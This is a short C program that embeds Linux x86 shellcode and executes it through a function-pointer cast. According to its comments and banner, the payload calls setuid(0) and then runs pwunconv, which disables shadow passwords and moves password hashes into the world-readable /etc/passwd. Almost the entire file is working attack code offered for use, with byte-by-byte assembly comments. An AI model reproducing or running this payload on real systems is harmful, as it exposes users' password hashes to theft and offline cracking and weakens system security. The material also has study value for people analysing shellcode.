#include <stdio.h>

const char sc[]= "\x31\xdb" //xor ebx,ebx
                 "\x8d\x43\x17" //LEA eax,[ebx + 0x17] /LEA is FASTER than push and pop!
                 "\x99" //cdq
                 "\xcd\x80" //int 80 //setuid(0) shouldn't returns -1 right? ;)
                 "\xb0\x0b" //mov al,0bh
                 "\x52" //push edx /Termina la cadena con un 0
                 "\x68\x63\x6f\x6e\x76" //push dword "conv"
                 "\x68\x70\x77\x75\x6e" //push dword "pwun"
                 "\x68\x62\x69\x6e\x2f" //push dword "bin/"
                 "\x68\x73\x72\x2f\x73" //push dword "sr/s"
                 "\x68\x2f\x2f\x2f\x75" //push dword "///u"
                 "\x89\xe3" //mov ebx,esp
                 "\x89\xd1" //mov ecx,edx
                 "\xcd\x80"; //int 80h

void main()
{
  printf("\n~ This shellcode disables shadowing on a linux system ~"
         "\n\n\t ~ Coded by vlan7 ~"
         "\n\t ~ http://vlan7.blogspot.com ~"
         "\n\n ~ Date: 4/Jul/2009"

         "\n\tYou'll have the passwords stored in /etc/passwd."
		 "\n\tFor undo purposes use the pwconv command."
         "\n\t ~ Cheers go to: Wadalbertia"
         "\n\t ~ Shellcode Size: %d bytes\n\n",
                sizeof(sc)-1);

        (*(void (*)()) sc)();
}